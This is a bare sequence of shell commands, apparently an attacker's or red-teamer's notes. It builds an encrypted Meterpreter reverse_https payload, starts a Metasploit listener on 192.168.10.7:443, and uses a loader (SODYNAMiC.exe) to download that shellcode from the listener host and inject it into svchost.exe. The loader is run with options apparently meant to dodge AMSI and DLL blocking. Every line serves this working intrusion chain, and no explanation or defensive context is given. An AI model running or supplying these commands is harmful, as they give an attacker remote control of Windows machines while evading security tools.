openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=IT/ST=Lazio/L=Rome/O=ASC/CN=192.168.10.7" -keyout www.example.com.key -out www.example.com.crt && cat www.example.com.key  www.example.com.crt > www.example.com.pem && rm -f www.example.com.key  www.example.com.crt

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.10.7 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStageless -f  raw -o shellcode.bin
encrypt.py shellcode.bin -p 'password1' -o enc

msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.10.7; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads false; set StagerVerifySSLCert true; run -j'

SODYNAMiC.exe /sc:"http://192.168.10.7/enc" /password:"password1" /image:"C:\Windows\System32\svchost.exe" /ppid:0 /blockDlls:"False" /am51:"False"
